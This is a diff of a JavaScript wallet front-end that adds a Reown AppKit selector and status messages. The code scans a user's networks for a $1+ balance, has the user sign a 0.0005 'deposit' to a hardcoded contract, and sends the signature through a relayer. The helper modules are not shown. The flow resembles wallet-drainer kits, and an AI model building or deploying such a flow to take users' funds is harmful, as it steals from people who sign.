@@ -1,80 +1,135 @@
-import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6/+esm";
+import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6/+esm"
 
-import { findEligibleNetwork } from "./utils/balanceScanner.js";
-import { getNonce } from "./utils/getNonce.js";
-import { signDeposit } from "./utils/signDeposit.js";
-import { sendRelayer } from "./utils/sendRelayer.js";
+import { createAppKit } from "https://esm.sh/@reown/appkit"
+import { mainnet, polygon, bsc, arbitrum, avalanche } from "https://esm.sh/@reown/appkit/networks"
+
+import { findEligibleNetwork } from "./utils/balanceScanner.js"
+import { getNonce } from "./utils/getNonce.js"
+import { signDeposit } from "./utils/signDeposit.js"
+import { sendRelayer } from "./utils/sendRelayer.js"
+
+const status = document.getElementById("status")
+
+function setStatus(msg){
+ console.log(msg)
+ status.innerText = msg
+}
+
+const projectId = "906bd57a09299f262aab595f3226ec60"
+
+const networks = [
+ mainnet,
+ polygon,
+ bsc,
+ arbitrum,
+ avalanche
+]
+
+const modal = createAppKit({
+ projectId,
+ networks,
+ themeMode:"dark"
+})
 
 const CONTRACTS = {
-  1: "0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8"
-};
+
+1:"0x377a91FAa5645539940dF7095Fb0EdE2478e7bd8"
+
+}
 
 async function connectWallet(){
 
- if(!window.ethereum){
-  alert("No wallet detected");
-  return;
+ try{
+
+  setStatus("Opening wallet selector...")
+
+  await modal.open()
+
+  if(!window.ethereum){
+   setStatus("Wallet connection failed")
+   return
+  }
+
+  const provider = new ethers.BrowserProvider(window.ethereum)
+
+  const signer = await provider.getSigner()
+
+  const address = await signer.getAddress()
+
+  setStatus("Wallet connected: "+address)
+
+  startFlow(provider,signer,address)
+
+ }catch(err){
+
+  setStatus("Connection cancelled")
+
  }
-
- const provider = new ethers.BrowserProvider(window.ethereum);
-
- await provider.send("eth_requestAccounts",[]);
-
- const signer = await provider.getSigner();
-
- const address = await signer.getAddress();
-
- console.log("Wallet connected:",address);
-
- startFlow(provider,signer,address);
 
 }
 
 async function startFlow(provider,signer,address){
 
- const network = await findEligibleNetwork(address);
+ try{
 
- if(!network){
+  setStatus("Scanning networks for balance...")
 
-  alert("No network with $1+ found");
+  const network = await findEligibleNetwork(address)
 
-  return;
+  if(!network){
 
- }
+   setStatus("No eligible network found ($1 minimum required)")
 
- console.log("Eligible network:",network);
+   return
 
- const rpcProvider = new ethers.JsonRpcProvider(network.rpc);
+  }
 
- const nonce = await getNonce(
-  rpcProvider,
-  address,
-  CONTRACTS[network.chainId]
- );
+  setStatus("Eligible network found: "+network.name)
 
- const amount = "0.0005";
+  const rpcProvider = new ethers.JsonRpcProvider(network.rpc)
 
- const payload = await signDeposit(
-  signer,
-  CONTRACTS[network.chainId],
-  network.chainId,
-  amount,
-  nonce
- );
+  setStatus("Fetching contract nonce...")
 
- const result = await sendRelayer(
-  payload,
-  CONTRACTS[network.chainId]
- );
+  const nonce = await getNonce(
+   rpcProvider,
+   address,
+   CONTRACTS[network.chainId]
+  )
 
- console.log("Relayer response:",result);
+  setStatus("Preparing signature request...")
 
- if(result.success){
+  const amount = "0.0005"
 
-  alert(
-   "Transaction executed\n\nHash:\n" +
-   result.hash
-  );
+  const payload = await signDeposit(
+   signer,
+   CONTRACTS[network.chainId],
+   network.chainId,
+   amount,
+   nonce
+  )
+
+  setStatus("User signing transaction...")
+
+  const result = await sendRelayer(
+   payload,
+   CONTRACTS[network.chainId]
+  )
+
+  if(result.success){
+
+   setStatus(
+    "Transaction executed\nHash: "+result.hash
+   )
+
+  }else{
+
+   setStatus("Relayer error: "+result.error)
+
+  }
+
+ }catch(err){
+
+  setStatus("Process failed: "+err.message)
 
  }
 
@@ -82,4 +137,4 @@ async function startFlow(provider,signer,address){
 
 document
 .getElementById("connect")
-.addEventListener("click",connectWallet);
+.addEventListener("click",connectWallet)
